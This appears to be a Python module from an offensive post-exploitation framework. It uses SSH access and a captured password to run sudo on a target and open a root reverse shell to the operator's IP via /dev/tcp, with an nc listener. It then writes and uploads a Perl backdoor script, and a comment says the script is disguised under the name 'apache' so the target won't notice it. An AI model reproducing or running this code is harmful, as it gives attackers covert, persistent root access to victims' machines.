from module import *
import os
import cmd
from colorama import *
from definitions import *

class Bash(Module):
    prompt = Fore.RED + "(bash) " + Fore.BLUE + ">> " + Fore.RESET 
    
    def __init__(self, target, core):
        cmd.Cmd.__init__(self)
        self.intro = GOOD + "Using Bash module"
        self.target = target
        self.core = core
        self.options = {
                "port"   : Option("port", 53923, "port to connect to", True),
                }
    
    def check_valid(self):
        return True
    
    def get_value(self, name):
        if name in self.options:
            return self.options[name].value
        else:
            return None


    def do_exploit(self, args):
        port = self.get_value("port")

        raw_input("Please enter the following command: nc -v -n -l -p %s in another shell to connect." % port)
        print(GOOD + "Initializing backdoor...")
        self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S nohup bash -i >& /dev/tcp/" + self.localIP + "/%s 0>&1" % port)
        print(GOOD + "Bash Backdoor on port %s attempted. You may need to input the password, which is " + self.target.pword)










        toW = 'perl/prsA.pl'
        stringToAdd = ""
        fileToWrite = open(toW, 'w')

        with open ("perl/prs1", "r") as myfile:
            data=myfile.read()
        data = data[:-1]#remove the last new line character.
        stringToAdd+=data + self.localIP

        with open ("perl/prs2", "r") as myfile:
            data=myfile.read()
        stringToAdd+=data
        fileToWrite.write(stringToAdd)
        fileToWrite.close()

        raw_input("Run the following command: nc -v -n -l -p %s in another shell to start the listener." % port)
        self.target.scpFiles(self, 'perl/prsA.pl', False)
        print("Moving the backdoor script.")
        self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S nohup perl prsA.pl")
        print("Perl backdoor on port %s attempted. It's named apache so the target won't see what's going on. If you stop the listener, the backdoor will stop." % port)








